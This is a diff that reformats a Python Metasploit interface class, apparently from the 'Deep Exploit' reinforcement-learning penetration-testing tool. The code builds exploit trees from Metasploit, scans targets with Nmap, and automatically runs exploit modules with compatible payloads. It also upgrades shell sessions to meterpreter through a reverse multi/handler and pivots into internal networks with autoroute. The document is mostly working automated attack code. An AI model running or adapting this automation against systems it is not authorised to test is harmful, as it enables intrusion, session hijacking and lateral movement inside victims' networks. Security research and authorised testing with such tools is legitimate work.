@@ -5,6 +5,8 @@ from lib.Constants import *
 '''
 Metasploit Interface
 '''
+
+
 class Metasploit:
     def __init__(self, target_ip='127.0.0.1'):
         self.util = Utilty()
@@ -25,11 +27,13 @@ class Metasploit:
         self.timeout = int(config['Common']['timeout'])
         self.max_attempt = int(config['Common']['max_attempt'])
         self.save_path = os.path.join(full_path, config['Common']['save_path'])
-        self.save_file = os.path.join(self.save_path, config['Common']['save_file'])
+        self.save_file = os.path.join(
+            self.save_path, config['Common']['save_file'])
         self.data_path = os.path.join(full_path, config['Common']['data_path'])
         if os.path.exists(self.data_path) is False:
             os.mkdir(self.data_path)
-        self.plot_file = os.path.join(self.data_path, config['Common']['plot_file'])
+        self.plot_file = os.path.join(
+            self.data_path, config['Common']['plot_file'])
         self.port_div_symbol = config['Common']['port_div']
 
         # Metasploit options setting value.
@@ -37,8 +41,10 @@ class Metasploit:
         self.lport = int(config['Metasploit']['lport'])
         self.proxy_host = config['Metasploit']['proxy_host']
         self.proxy_port = int(config['Metasploit']['proxy_port'])
-        self.prohibited_list = str(config['Metasploit']['prohibited_list']).split('@')
-        self.path_collection = str(config['Metasploit']['path_collection']).split('@')
+        self.prohibited_list = str(
+            config['Metasploit']['prohibited_list']).split('@')
+        self.path_collection = str(
+            config['Metasploit']['path_collection']).split('@')
 
         # Nmap options setting value.
         self.nmap_command = config['Nmap']['command']
@@ -56,24 +62,32 @@ class Metasploit:
         self.eps_steps = int(self.train_max_num * self.greedy_rate)
 
         # State setting value.
-        self.state = []                                            # Deep Exploit's state(s).
+        # Deep Exploit's state(s).
+        self.state = []
         self.os_type = str(config['State']['os_type']).split('@')  # OS type.
         self.os_real = len(self.os_type) - 1
-        self.service_list = str(config['State']['services']).split('@')  # Product name.
+        # Product name.
+        self.service_list = str(config['State']['services']).split('@')
 
         # Report setting value.
-        self.report_test_path = os.path.join(full_path, config['Report']['report_test'])
-        self.report_train_path = os.path.join(self.report_test_path, config['Report']['report_train'])
+        self.report_test_path = os.path.join(
+            full_path, config['Report']['report_test'])
+        self.report_train_path = os.path.join(
+            self.report_test_path, config['Report']['report_train'])
         if os.path.exists(self.report_train_path) is False:
             os.mkdir(self.report_train_path)
         self.scan_start_time = self.util.get_current_date()
-        self.source_host= server_host
+        self.source_host = server_host
 
-        self.client = Msgrpc({'host': server_host, 'port': server_port})  # Create Msgrpc instance.
-        self.client.login(self.msgrpc_user, self.msgrpc_pass)  # Log in to RPC Server.
-        self.client.get_console()                              # Get MSFconsole ID.
+        # Create Msgrpc instance.
+        self.client = Msgrpc({'host': server_host, 'port': server_port})
+        # Log in to RPC Server.
+        self.client.login(self.msgrpc_user, self.msgrpc_pass)
+        # Get MSFconsole ID.
+        self.client.get_console()
         self.buffer_seq = 0
-        self.isPostExploit = False                             # Executing Post-Exploiting True/False.
+        # Executing Post-Exploiting True/False.
+        self.isPostExploit = False
 
     # Create exploit tree.
     def get_exploit_tree(self):
@@ -85,26 +99,31 @@ class Metasploit:
                 temp_tree = {}
                 # Set exploit module.
                 use_cmd = 'use exploit/' + exploit + '\n'
-                _ = self.client.send_command(self.client.console_id, use_cmd, False)
+                _ = self.client.send_command(
+                    self.client.console_id, use_cmd, False)
 
                 # Get target.
                 show_cmd = 'show targets\n'
                 target_info = ''
                 time_count = 0
                 while True:
-                    target_info = self.client.send_command(self.client.console_id, show_cmd, False)
+                    target_info = self.client.send_command(
+                        self.client.console_id, show_cmd, False)
                     if 'Exploit targets' in target_info:
                         break
                     if time_count == 5:
-                        self.util.print_message(OK, 'Timeout: {0}'.format(show_cmd))
+                        self.util.print_message(
+                            OK, 'Timeout: {0}'.format(show_cmd))
                         self.util.print_message(OK, 'No exist Targets.')
                         break
                     time.sleep(1.0)
                     time_count += 1
-                target_list = self.cutting_strings(r'\s*([0-9]{1,3}) .*[a-z|A-Z|0-9].*[\r\n]', target_info)
+                target_list = self.cutting_strings(
+                    r'\s*([0-9]{1,3}) .*[a-z|A-Z|0-9].*[\r\n]', target_info)
                 for target in target_list:
                     # Get payload list.
-                    payload_list = self.client.get_target_compatible_payload_list(exploit, int(target))
+                    payload_list = self.client.get_target_compatible_payload_list(
+                        exploit, int(target))
                     temp_tree[target] = payload_list
 
                 # Get options.
@@ -123,9 +142,11 @@ class Metasploit:
                         else:
                             end_option = {}
                             if isinstance(options[key][sub_key], bytes):
-                                sub_option[sub_key.decode('utf-8')] = options[key][sub_key].decode('utf-8')
+                                sub_option[sub_key.decode(
+                                    'utf-8')] = options[key][sub_key].decode('utf-8')
                             else:
-                                sub_option[sub_key.decode('utf-8')] = options[key][sub_key]
+                                sub_option[sub_key.decode(
+                                    'utf-8')] = options[key][sub_key]
 
                     # User specify.
                     sub_option['user_specify'] = ""
@@ -143,14 +164,16 @@ class Metasploit:
                                                                                   len(target_list)))
 
             # Save exploit tree to local file.
-            fout = codecs.open(os.path.join(self.data_path, 'exploit_tree.json'), 'w', 'utf-8')
+            fout = codecs.open(os.path.join(
+                self.data_path, 'exploit_tree.json'), 'w', 'utf-8')
             json.dump(exploit_tree, fout, indent=4)
             fout.close()
             self.util.print_message(OK, 'Saved exploit tree.')
         else:
             # Get exploit tree from local file.
             local_file = os.path.join(self.data_path, 'exploit_tree.json')
-            self.util.print_message(OK, 'Loaded exploit tree from : {}'.format(local_file))
+            self.util.print_message(
+                OK, 'Loaded exploit tree from : {}'.format(local_file))
             fin = codecs.open(local_file, 'r', 'utf-8')
             exploit_tree = json.loads(fin.read().replace('\0', ''))
             fin.close()
@@ -166,23 +189,28 @@ class Metasploit:
             path_list = ['' for idx in range(len(com_port_list))]
             # TODO: Crawling on the Post-Exploitation phase.
             if self.isPostExploit is False:
-                web_port_list = self.util.check_web_port(rhost, com_port_list, self.client)
-                web_target_info = self.util.run_spider(rhost, web_port_list, self.client)
+                web_port_list = self.util.check_web_port(
+                    rhost, com_port_list, self.client)
+                web_target_info = self.util.run_spider(
+                    rhost, web_port_list, self.client)
                 classifier = self.util.load_plugin('classifier_signature')
                 if classifier is not None:
                     self.util.print_message(OK, 'Gather HTTP responses.')
-                    web_prod_list = classifier.classifier_signature(web_target_info, self.client)
+                    web_prod_list = classifier.classifier_signature(
+                        web_target_info, self.client)
                 for idx, web_prod in enumerate(web_prod_list):
                     web_item = web_prod.split('@')
                     proto_list.append('tcp')
                     port_info.append(web_item[0] + ' ' + web_item[1])
-                    com_port_list.append(web_item[2] + self.port_div_symbol + str(idx))
+                    com_port_list.append(
+                        web_item[2] + self.port_div_symbol + str(idx))
                     path_list.append(web_item[3])
 
             # Create target info.
             target_tree = {'rhost': rhost, 'os_type': self.os_real}
             for port_idx, port_num in enumerate(com_port_list):
-                temp_tree = {'prod_name': '', 'version': 0.0, 'protocol': '', 'target_path': '', 'exploit': []}
+                temp_tree = {'prod_name': '', 'version': 0.0,
+                             'protocol': '', 'target_path': '', 'exploit': []}
 
                 # Get product name.
                 service_name = 'unknown'
@@ -202,33 +230,40 @@ class Metasploit:
                 version = 0.0
                 output_version = 0.0
                 for (idx, regex) in enumerate(regex_list):
-                    version_raw = self.cutting_strings(regex, port_info[port_idx])
+                    version_raw = self.cutting_strings(
+                        regex, port_info[port_idx])
                     if len(version_raw) == 0:
                         continue
                     if idx == 0:
                         index = version_raw[0].rfind('.')
-                        version = version_raw[0][:index] + version_raw[0][index + 1:]
+                        version = version_raw[0][:index] + \
+                            version_raw[0][index + 1:]
                         output_version = version_raw[0]
                         break
                     elif idx == 1:
                         index = re.search(r'[a-z]', version_raw[0]).start()
-                        version = version_raw[0][:index] + str(ord(version_raw[0][index])) + version_raw[0][index + 1:]
+                        version = version_raw[0][:index] + str(
+                            ord(version_raw[0][index])) + version_raw[0][index + 1:]
                         output_version = version_raw[0]
                         break
                     elif idx == 2:
                         index = re.search(r'[a-z]', version_raw[0]).start()
-                        version = version_raw[0][:index] + str(ord(version_raw[0][index])) + version_raw[0][index + 1:]
+                        version = version_raw[0][:index] + str(
+                            ord(version_raw[0][index])) + version_raw[0][index + 1:]
                         index = version.rfind('.')
-                        version = version_raw[0][:index] + version_raw[0][index:]
+                        version = version_raw[0][:index] + \
+                            version_raw[0][index:]
                         output_version = version_raw[0]
                         break
                     elif idx == 3:
-                        version = self.cutting_strings(r'[a-z]?(\d\.\d)', version_raw[0])
+                        version = self.cutting_strings(
+                            r'[a-z]?(\d\.\d)', version_raw[0])
                         version = version[0]
                         output_version = version_raw[0]
                         break
                     elif idx == 4:
-                        version = version_raw[0].replace('X', '0').replace('x', '0').replace('*', '0')
+                        version = version_raw[0].replace(
+                            'X', '0').replace('x', '0').replace('*', '0')
                         version = version[0]
                         output_version = version_raw[0]
                 temp_tree['version'] = float(version)
@@ -244,10 +279,13 @@ class Metasploit:
                 raw_module_info = ''
                 idx = 0
                 search_cmd = 'search name:' + service_name + ' type:exploit app:server\n'
-                raw_module_info = self.client.send_command(self.client.console_id, search_cmd, False, 3.0)
-                module_list = self.extract_osmatch_module(self.cutting_strings(r'(exploit/.*)', raw_module_info))
+                raw_module_info = self.client.send_command(
+                    self.client.console_id, search_cmd, False, 3.0)
+                module_list = self.extract_osmatch_module(
+                    self.cutting_strings(r'(exploit/.*)', raw_module_info))
                 if service_name != 'unknown' and len(module_list) == 0:
-                    self.util.print_message(WARNING, 'Can\'t load exploit module: {}'.format(service_name))
+                    self.util.print_message(
+                        WARNING, 'Can\'t load exploit module: {}'.format(service_name))
                     temp_tree['prod_name'] = 'unknown'
 
                 for module in module_list:
@@ -264,14 +302,17 @@ class Metasploit:
                                                                                   len(temp_tree['exploit'])))
 
             # Save target host information to local file.
-            fout = codecs.open(os.path.join(self.data_path, 'target_info_' + rhost + '.json'), 'w', 'utf-8')
+            fout = codecs.open(os.path.join(
+                self.data_path, 'target_info_' + rhost + '.json'), 'w', 'utf-8')
             json.dump(target_tree, fout, indent=4)
             fout.close()
             self.util.print_message(OK, 'Saved target tree.')
         else:
             # Get target host information from local file.
-            saved_file = os.path.join(self.data_path, 'target_info_' + rhost + '.json')
-            self.util.print_message(OK, 'Loaded target tree from : {}'.format(saved_file))
+            saved_file = os.path.join(
+                self.data_path, 'target_info_' + rhost + '.json')
+            self.util.print_message(
+                OK, 'Loaded target tree from : {}'.format(saved_file))
             fin = codecs.open(saved_file, 'r', 'utf-8')
             target_tree = json.loads(fin.read().replace('\0', ''))
             fin.close()
@@ -280,13 +321,15 @@ class Metasploit:
 
     # Get target host information for indicate port number.
     def get_target_info_indicate(self, rhost, proto_list, port_info, port=None, prod_name=None):
-        self.util.print_message(NOTE, 'Get target info for indicate port number.')
+        self.util.print_message(
+            NOTE, 'Get target info for indicate port number.')
         target_tree = {'origin_port': port}
 
         # Update "com_port_list".
         com_port_list = []
         for prod in prod_name.split('@'):
-            temp_tree = {'prod_name': '', 'version': 0.0, 'protocol': '', 'exploit': []}
+            temp_tree = {'prod_name': '', 'version': 0.0,
+                         'protocol': '', 'exploit': []}
             virtual_port = str(np.random.randint(999999999))
             com_port_list.append(virtual_port)
 
@@ -309,13 +352,16 @@ class Metasploit:
             raw_module_info = ''
             idx = 0
             search_cmd = 'search name:' + service_name + ' type:exploit app:server\n'
-            raw_module_info = self.client.send_command(self.client.console_id, search_cmd, False, 3.0)
-            module_list = self.cutting_strings(r'(exploit/.*)', raw_module_info)
+            raw_module_info = self.client.send_command(
+                self.client.console_id, search_cmd, False, 3.0)
+            module_list = self.cutting_strings(
+                r'(exploit/.*)', raw_module_info)
             if service_name != 'unknown' and len(module_list) == 0:
                 continue
             for exploit in module_list:
                 raw_exploit_info = exploit.split(' ')
-                exploit_info = list(filter(lambda s: s != '', raw_exploit_info))
+                exploit_info = list(
+                    filter(lambda s: s != '', raw_exploit_info))
                 if exploit_info[2] in {'excellent', 'great', 'good'}:
                     temp_tree['exploit'].append(exploit_info[0])
             target_tree[virtual_port] = temp_tree
@@ -387,11 +433,13 @@ class Metasploit:
         if target_idx == ST_SERV_NAME:
             service_num = self.state[ST_SERV_NAME]
             service_num_mean = len(self.service_list) / 2
-            self.state[ST_SERV_NAME] = (service_num - service_num_mean) / service_num_mean
+            self.state[ST_SERV_NAME] = (
+                service_num - service_num_mean) / service_num_mean
         elif target_idx == ST_MODULE:
             prompt_num = self.state[ST_MODULE]
             prompt_num_mean = len(com_exploit_list) / 2
-            self.state[ST_MODULE] = (prompt_num - prompt_num_mean) / prompt_num_mean
+            self.state[ST_MODULE] = (
+                prompt_num - prompt_num_mean) / prompt_num_mean
 
     # Execute Nmap.
     def execute_nmap(self, rhost, command, timeout):
@@ -399,27 +447,34 @@ class Metasploit:
         if os.path.exists(os.path.join(self.data_path, 'target_info_' + rhost + '.json')) is False:
             # Execute Nmap.
             self.util.print_message(OK, '{}'.format(command))
-            self.util.print_message(OK, 'Start time: {}'.format(self.util.get_current_date()))
-            _ = self.client.call('console.write', [self.client.console_id, command])
+            self.util.print_message(
+                OK, 'Start time: {}'.format(self.util.get_current_date()))
+            _ = self.client.call(
+                'console.write', [self.client.console_id, command])
 
             time.sleep(3.0)
             time_count = 0
             while True:
                 # Judgement of Nmap finishing.
-                ret = self.client.call('console.read', [self.client.console_id])
+                ret = self.client.call(
+                    'console.read', [self.client.console_id])
                 try:
                     if (time_count % 5) == 0:
-                        self.util.print_message(OK, 'Port scanning: {} [Elapsed time: {} s]'.format(rhost, time_count))
+                        self.util.print_message(
+                            OK, 'Port scanning: {} [Elapsed time: {} s]'.format(rhost, time_count))
                         self.client.keep_alive()
                     if timeout == time_count:
                         self.client.termination(self.client.console_id)
-                        self.util.print_message(OK, 'Timeout   : {}'.format(command))
-                        self.util.print_message(OK, 'End time  : {}'.format(self.util.get_current_date()))
+                        self.util.print_message(
+                            OK, 'Timeout   : {}'.format(command))
+                        self.util.print_message(
+                            OK, 'End time  : {}'.format(self.util.get_current_date()))
                         break
 
                     status = ret.get(b'busy')
                     if status is False:
-                        self.util.print_message(OK, 'End time  : {}'.format(self.util.get_current_date()))
+                        self.util.print_message(
+                            OK, 'End time  : {}'.format(self.util.get_current_date()))
                         time.sleep(5.0)
                         break
                 except Exception as e:
@@ -440,7 +495,8 @@ class Metasploit:
 
     # Get port list from Nmap's XML result.
     def get_port_list(self, nmap_result_file, rhost):
-        self.util.print_message(NOTE, 'Get port list from {}.'.format(nmap_result_file))
+        self.util.print_message(
+            NOTE, 'Get port list from {}.'.format(nmap_result_file))
         global com_port_list
         port_list = []
         proto_list = []
@@ -448,16 +504,19 @@ class Metasploit:
         if os.path.exists(os.path.join(self.data_path, 'target_info_' + rhost + '.json')) is False:
             nmap_result = ''
             cat_cmd = 'cat ' + nmap_result_file + '\n'
-            _ = self.client.call('console.write', [self.client.console_id, cat_cmd])
+            _ = self.client.call(
+                'console.write', [self.client.console_id, cat_cmd])
             time.sleep(3.0)
             time_count = 0
             while True:
                 # Judgement of 'services' command finishing.
-                ret = self.client.call('console.read', [self.client.console_id])
+                ret = self.client.call(
+                    'console.read', [self.client.console_id])
                 try:
                     if self.timeout == time_count:
                         self.client.termination(self.client.console_id)
-                        self.util.print_message(OK, 'Timeout: "{}"'.format(cat_cmd))
+                        self.util.print_message(
+                            OK, 'Timeout: "{}"'.format(cat_cmd))
                         break
 
                     nmap_result += ret.get(b'data').decode('utf-8')
@@ -521,8 +580,10 @@ class Metasploit:
                     self.os_real = idx
         else:
             # Get target host information from local file.
-            saved_file = os.path.join(self.data_path, 'target_info_' + rhost + '.json')
-            self.util.print_message(OK, 'Loaded target tree from : {}'.format(saved_file))
+            saved_file = os.path.join(
+                self.data_path, 'target_info_' + rhost + '.json')
+            self.util.print_message(
+                OK, 'Loaded target tree from : {}'.format(saved_file))
             fin = codecs.open(saved_file, 'r', 'utf-8')
             target_tree = json.loads(fin.read().replace('\0', ''))
             fin.close()
@@ -540,7 +601,8 @@ class Metasploit:
         self.util.print_message(NOTE, 'Get exploit list.')
         all_exploit_list = []
         if os.path.exists(os.path.join(self.data_path, 'exploit_list.csv')) is False:
-            self.util.print_message(OK, 'Loading exploit list from Metasploit.')
+            self.util.print_message(
+                OK, 'Loading exploit list from Metasploit.')
 
             # Get Exploit module list.
             all_exploit_list = []
@@ -553,7 +615,8 @@ class Metasploit:
                     if rank in {'excellent', 'great', 'good'}:
                         all_exploit_list.append(exploit)
                         self.util.print_message(OK, '{}/{} Loaded exploit: {}'.format(str(idx + 1),
-                                                                                      len(exploit_candidate_list),
+                                                                                      len(
+                                                                                          exploit_candidate_list),
                                                                                       exploit))
                     else:
                         self.util.print_message(WARNING, '{}/{} {} module is danger (rank: {}). Can\'t load.'
@@ -563,8 +626,10 @@ class Metasploit:
                     exit(1)
 
             # Save Exploit module list to local file.
-            self.util.print_message(OK, 'Total loaded exploit module: {}'.format(str(len(all_exploit_list))))
-            fout = codecs.open(os.path.join(self.data_path, 'exploit_list.csv'), 'w', 'utf-8')
+            self.util.print_message(
+                OK, 'Total loaded exploit module: {}'.format(str(len(all_exploit_list))))
+            fout = codecs.open(os.path.join(
+                self.data_path, 'exploit_list.csv'), 'w', 'utf-8')
             for item in all_exploit_list:
                 fout.write(item + '\n')
             fout.close()
@@ -572,7 +637,8 @@ class Metasploit:
         else:
             # Get exploit module list from local file.
             local_file = os.path.join(self.data_path, 'exploit_list.csv')
-            self.util.print_message(OK, 'Loaded exploit list from : {}'.format(local_file))
+            self.util.print_message(
+                OK, 'Loaded exploit list from : {}'.format(local_file))
             fin = codecs.open(local_file, 'r', 'utf-8')
             for item in fin:
                 all_exploit_list.append(item.rstrip('\n'))
@@ -584,7 +650,8 @@ class Metasploit:
         self.util.print_message(NOTE, 'Get payload list.')
         all_payload_list = []
         if os.path.exists(os.path.join(self.data_path, 'payload_list.csv')) is False or module_name != '':
-            self.util.print_message(OK, 'Loading payload list from Metasploit.')
+            self.util.print_message(
+                OK, 'Loading payload list from Metasploit.')
 
             # Get payload list.
             payload_list = []
@@ -593,7 +660,8 @@ class Metasploit:
                 payload_list = self.client.get_module_list('payload')
 
                 # Save payload list to local file.
-                fout = codecs.open(os.path.join(self.data_path, 'payload_list.csv'), 'w', 'utf-8')
+                fout = codecs.open(os.path.join(
+                    self.data_path, 'payload_list.csv'), 'w', 'utf-8')
                 for idx, item in enumerate(payload_list):
                     time.sleep(0.1)
                     self.util.print_message(OK, '{}/{} Loaded payload: {}'.format(str(idx + 1),
@@ -604,14 +672,17 @@ class Metasploit:
                 self.util.print_message(OK, 'Saved payload list.')
             elif target_num == '':
                 # Get payload that compatible exploit module.
-                payload_list = self.client.get_compatible_payload_list(module_name)
+                payload_list = self.client.get_compatible_payload_list(
+                    module_name)
             else:
                 # Get payload that compatible target.
-                payload_list = self.client.get_target_compatible_payload_list(module_name, target_num)
+                payload_list = self.client.get_target_compatible_payload_list(
+                    module_name, target_num)
         else:
             # Get payload list from local file.
             local_file = os.path.join(self.data_path, 'payload_list.csv')
-            self.util.print_message(OK, 'Loaded payload list from : {}'.format(local_file))
+            self.util.print_message(
+                OK, 'Loaded payload list from : {}'.format(local_file))
             payload_list = []
             fin = codecs.open(local_file, 'r', 'utf-8')
             for item in fin:
@@ -622,7 +693,8 @@ class Metasploit:
     # Reset state (s).
     def reset_state(self, exploit_tree, target_tree):
         # Randomly select target port number.
-        port_num = str(com_port_list[random.randint(0, len(com_port_list) - 1)])
+        port_num = str(
+            com_port_list[random.randint(0, len(com_port_list) - 1)])
         service_name = target_tree[port_num]['prod_name']
         if service_name == 'unknown':
             return True, None, None, None, None
@@ -809,14 +881,16 @@ class Metasploit:
             selected_payload = ''
 
         # Set options.
-        option = self.set_options(target_info, target, selected_payload, exploit_tree)
+        option = self.set_options(
+            target_info, target, selected_payload, exploit_tree)
 
         # Execute exploit.
         reward = 0
         message = ''
         session_list = {}
         done = False
-        job_id, uuid = self.client.execute_module('exploit', target_info['exploit'], option)
+        job_id, uuid = self.client.execute_module(
+            'exploit', target_info['exploit'], option)
         if uuid is not None:
             # Check status of running module.
             _ = self.check_running_module(job_id, uuid)
@@ -825,15 +899,19 @@ class Metasploit:
             if len(key_list) != 0:
                 # Probably successfully of exploitation (but unsettled).
                 for key in key_list:
-                    exploit_uuid = sessions[key][b'exploit_uuid'].decode('utf-8')
+                    exploit_uuid = sessions[key][b'exploit_uuid'].decode(
+                        'utf-8')
                     if uuid == exploit_uuid:
                         # Successfully of exploitation.
                         session_id = int(key)
                         session_type = sessions[key][b'type'].decode('utf-8')
                         session_port = str(sessions[key][b'session_port'])
-                        session_exploit = sessions[key][b'via_exploit'].decode('utf-8')
-                        session_payload = sessions[key][b'via_payload'].decode('utf-8')
-                        module_info = self.client.get_module_info('exploit', session_exploit)
+                        session_exploit = sessions[key][b'via_exploit'].decode(
+                            'utf-8')
+                        session_payload = sessions[key][b'via_payload'].decode(
+                            'utf-8')
+                        module_info = self.client.get_module_info(
+                            'exploit', session_exploit)
 
                         # Checking feasibility of post-exploitation.
                         # status, server_job_id, new_session_id = self.check_post_exploit(session_id, session_type)
@@ -858,11 +936,13 @@ class Metasploit:
 
                         # Gather reporting items.
                         vuln_name = module_info[b'name'].decode('utf-8')
-                        description = module_info[b'description'].decode('utf-8')
+                        description = module_info[b'description'].decode(
+                            'utf-8')
                         ref_list = module_info[b'references']
                         reference = ''
                         for item in ref_list:
-                            reference += '[' + item[0].decode('utf-8') + ']' + '@' + item[1].decode('utf-8') + '@@'
+                            reference += '[' + item[0].decode(
+                                'utf-8') + ']' + '@' + item[1].decode('utf-8') + '@@'
 
                         # Save reporting item for report.
                         if thread_type == 'learning':
@@ -1046,31 +1126,38 @@ class Metasploit:
                         # Search other servers in internal network.
                         internal_ip_list, _ = self.get_internal_ip(session_id)
                         if len(internal_ip_list) == 0:
-                            self.util.print_message(WARNING, 'Internal server is not found.')
+                            self.util.print_message(
+                                WARNING, 'Internal server is not found.')
                         else:
                             # Pivoting.
-                            self.util.print_message(OK, 'Internal server list.\n{}'.format(internal_ip_list))
+                            self.util.print_message(
+                                OK, 'Internal server list.\n{}'.format(internal_ip_list))
                             self.set_pivoting(session_id, internal_ip_list)
                         break
             else:
-                self.util.print_message(WARNING, 'Failure: Upgrade session from shell to meterpreter.')
+                self.util.print_message(
+                    WARNING, 'Failure: Upgrade session from shell to meterpreter.')
         elif session_type == 'meterpreter':
             # Search other servers in internal network.
             internal_ip_list, _ = self.get_internal_ip(session_id)
             if len(internal_ip_list) == 0:
-                self.util.print_message(WARNING, 'Internal server is not found.')
+                self.util.print_message(
+                    WARNING, 'Internal server is not found.')
             else:
                 # Pivoting.
-                self.util.print_message(OK, 'Internal server list.\n{}'.format(internal_ip_list))
+                self.util.print_message(
+                    OK, 'Internal server list.\n{}'.format(internal_ip_list))
                 self.set_pivoting(session_id, internal_ip_list)
         else:
-            self.util.print_message(WARNING, 'Unknown session type: {}.'.format(session_type))
+            self.util.print_message(
+                WARNING, 'Unknown session type: {}.'.format(session_type))
         return internal_ip_list
 
     # Upgrade session from shell to meterpreter.
     def upgrade_shell(self, session_id):
         # Upgrade shell session to meterpreter.
-        self.util.print_message(NOTE, 'Upgrade session from shell to meterpreter.')
+        self.util.print_message(
+            NOTE, 'Upgrade session from shell to meterpreter.')
         payload = ''
         # TODO: examine payloads each OS systems.
         if self.os_real == 0:
@@ -1083,15 +1170,18 @@ class Metasploit:
         # Launch multi handler.
         module = 'exploit/multi/handler'
         lport = random.randint(10001, 65535)
-        option = {'LHOST': self.lhost, 'LPORT': lport, 'PAYLOAD': payload, 'TARGET': 0}
+        option = {'LHOST': self.lhost, 'LPORT': lport,
+                  'PAYLOAD': payload, 'TARGET': 0}
         job_id, uuid = self.client.execute_module('exploit', module, option)
         time.sleep(0.5)
         if uuid is None:
-            self.util.print_message(FAIL, 'Failure executing module: {}'.format(module))
+            self.util.print_message(
+                FAIL, 'Failure executing module: {}'.format(module))
             return 'failure', job_id, lport
 
         # Execute upgrade.
-        status = self.client.upgrade_shell_session(session_id, self.lhost, lport)
+        status = self.client.upgrade_shell_session(
+            session_id, self.lhost, lport)
         return status, job_id, lport
 
     # Check status of running module.
@@ -1106,7 +1196,8 @@ class Metasploit:
                 return True
             if self.timeout == time_count:
                 self.client.stop_job(str(job_id))
-                self.util.print_message(WARNING, 'Timeout: job_id={}, uuid={}'.format(job_id, uuid))
+                self.util.print_message(
+                    WARNING, 'Timeout: job_id={}, uuid={}'.format(job_id, uuid))
                 return False
             time_count += 1
 
@@ -1137,7 +1228,8 @@ class Metasploit:
         time.sleep(3.0)
         data = self.client.get_meterpreter_result(session_id)
         if data is not None:
-            self.util.print_message(OK, 'Result of get_local_subnets: \n{}'.format(data))
+            self.util.print_message(
+                OK, 'Result of get_local_subnets: \n{}'.format(data))
             regex_pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
             temp_subnet = self.cutting_strings(regex_pattern, data)
             try:
@@ -1163,4 +1255,5 @@ class Metasploit:
             cmd = 'run autoroute -s ' + subnet[0] + ' ' + subnet[1] + '\n'
             _ = self.client.execute_meterpreter(session_id, cmd)
             time.sleep(3.0)
-            _ = self.client.execute_meterpreter(session_id, 'run autoroute -p\n')
+            _ = self.client.execute_meterpreter(
+                session_id, 'run autoroute -p\n')
